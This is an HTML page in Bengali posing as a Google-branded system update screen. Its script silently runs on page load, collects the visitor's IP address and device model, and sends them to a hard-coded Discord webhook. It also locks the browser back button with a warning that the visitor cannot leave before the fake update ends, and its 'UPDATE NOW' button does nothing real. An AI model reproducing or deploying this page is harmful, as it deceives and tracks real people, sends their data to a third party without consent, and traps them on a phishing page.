<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Intelligence</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .box { text-align: center; width: 80%; }
        .btn { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" width="50"><br><br>
    <p>সিস্টেম আপডেট করার জন্য নিচের বাটনে ক্লিক করুন।</p>
    <button class="btn" onclick="grab()">UPDATE NOW</button>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

    // ১. এই ফাংশনটি ঢোকার সাথে সাথেই আইপি পাঠাবে (Instant)
    async function instantLog() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const model = navigator.userAgent.match(/\(([^)]+)\)/)[1];

            await fetch(WEBHOOK, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    content: "🔥 **INSTANT ALERT**",
                    embeds: [{
                        color: 16711680,
                        fields: [
                            { name: "IP Address", value: data.ip },
                            { name: "Phone Model", value: model }
                        ]
                    }]
                })
            });
        } catch (e) {}
    }

    // ২. ব্যাক বাটন লক (যাতে সে বের হতে না পারে)
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = function() {
        window.history.pushState(null, null, window.location.href);
        alert("সতর্কবার্তা: আপডেট শেষ না করে বের হওয়া যাবে না!");
    };

    function grab() {
        alert("আপনার সিস্টেম আপডেট শুরু হয়েছে। কিছুক্ষণ অপেক্ষা করুন।");
    }

    // পেজ লোড হওয়ার সাথে সাথেই রান করবে
    window.onload = instantLog;
</script>

</body>
</html>
